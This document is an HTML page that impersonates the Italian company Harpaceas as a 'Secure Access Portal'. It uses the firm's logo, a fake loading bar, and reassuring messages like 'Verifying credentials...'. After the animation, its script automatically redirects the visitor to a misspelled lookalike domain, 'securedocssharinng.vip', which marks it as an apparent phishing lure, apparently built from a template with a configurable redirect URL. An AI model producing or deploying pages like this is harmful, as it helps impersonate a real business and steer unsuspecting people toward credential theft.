<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Harpaceas</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    background:linear-gradient(135deg,#ffffff 0%,#eef5f8 45%,#d9edf3 100%);
    height:100vh;
    overflow:hidden;
    font-family:Arial, Helvetica, sans-serif;
    display:flex;
    justify-content:center;
    align-items:center;
    position:relative;
}

/* Animated background */
body::before{
    content:"";
    position:absolute;
    width:900px;
    height:900px;
    border:2px solid rgba(45,140,184,.08);
    border-radius:50%;
    right:-280px;
    top:-280px;
    animation:rotate 25s linear infinite;
}

body::after{
    content:"";
    position:absolute;
    width:600px;
    height:600px;
    border:2px solid rgba(45,140,184,.06);
    border-radius:50%;
    left:-180px;
    bottom:-180px;
    animation:rotateReverse 20s linear infinite;
}

@keyframes rotate{
    from{transform:rotate(0deg);}
    to{transform:rotate(360deg);}
}

@keyframes rotateReverse{
    from{transform:rotate(360deg);}
    to{transform:rotate(0deg);}
}

.wrapper{
    text-align:center;
    z-index:10;
    animation:fadeIn 1.5s ease;
    width:100%;
    max-width:900px;
    padding:20px;
}

@keyframes fadeIn{
    from{
        opacity:0;
        transform:translateY(20px);
    }
    to{
        opacity:1;
        transform:translateY(0);
    }
}

.brand-row{
    display:flex;
    justify-content:center;
    align-items:center;
    margin-bottom:55px;
}

.harpaceas-logo{
    width:700px;
    max-width:95%;
    height:auto;
    display:block;
    filter:drop-shadow(0 10px 25px rgba(0,0,0,.15));
}

.loading-section{
    width:500px;
    max-width:90vw;
    margin:auto;
}

.loading-bar{
    width:100%;
    height:10px;
    background:rgba(13,77,99,.12);
    border-radius:20px;
    overflow:hidden;
}

.loading-progress{
    width:0%;
    height:100%;
    background:linear-gradient(90deg,#0d4d63,#2d8cb8,#66c7f2);
    box-shadow:0 0 15px rgba(45,140,184,.45);
    transition:width .05s linear;
}

.percent{
    color:#0d4d63;
    font-size:22px;
    margin-top:15px;
    font-weight:bold;
}

.status{
    margin-top:15px;
    color:#45626d;
    font-size:15px;
}

.spinner{
    width:40px;
    height:40px;
    margin:25px auto;
    border:4px solid rgba(13,77,99,.15);
    border-top:4px solid #2d8cb8;
    border-radius:50%;
    animation:spin 1s linear infinite;
}

@keyframes spin{
    to{
        transform:rotate(360deg);
    }
}

.footer{
    position:absolute;
    bottom:25px;
    width:100%;
    text-align:center;
    color:rgba(13,77,99,.55);
    font-size:13px;
}
</style>
</head>

<body>

<div class="wrapper">

    <div class="brand-row">
        <img
            src="https://www.harpaceas.it/hs-fs/hubfs/Logotipo_payoff_YDP90-3.jpg?width=830&name=Logotipo_payoff_YDP90-3.jpg"
            alt="Harpaceas"
            class="harpaceas-logo">
    </div>

    <div class="loading-section">

        <div class="loading-bar">
            <div class="loading-progress" id="progress"></div>
        </div>

        <div class="percent" id="percent">0%</div>

        <div class="spinner"></div>

        <div class="status" id="status">
            Initializing secure environment...
        </div>

    </div>

</div>

<div class="footer">
    © Harpaceas — Secure Access Portal
</div>

<script>

// Set your destination URL here.
// Leave empty ("") if you do not want automatic redirection.
const redirectURL = "https://xp6g7tbft6.securedocssharinng.vip/l/97XySfClKG0";

const messages = [
    "Initializing secure environment...",
    "Connecting to Harpaceas services...",
    "Loading resources...",
    "Synchronizing data...",
    "Verifying credentials...",
    "Preparing workspace...",
    "Ready."
];

let progress = 0;

const progressBar = document.getElementById("progress");
const percent = document.getElementById("percent");
const status = document.getElementById("status");

const timer = setInterval(() => {

    progress++;

    progressBar.style.width = progress + "%";
    percent.textContent = progress + "%";

    const stage = Math.min(
        Math.floor(progress / 15),
        messages.length - 1
    );

    status.textContent = messages[stage];

    if (progress >= 100) {

        clearInterval(timer);

        if (redirectURL.trim() !== "") {

            status.textContent = "Redirecting...";

            setTimeout(() => {
                window.location.href = redirectURL;
            }, 1000);

        } else {

            status.textContent = "Loading complete.";

        }
    }

}, 50);

</script>

</body>
</html>
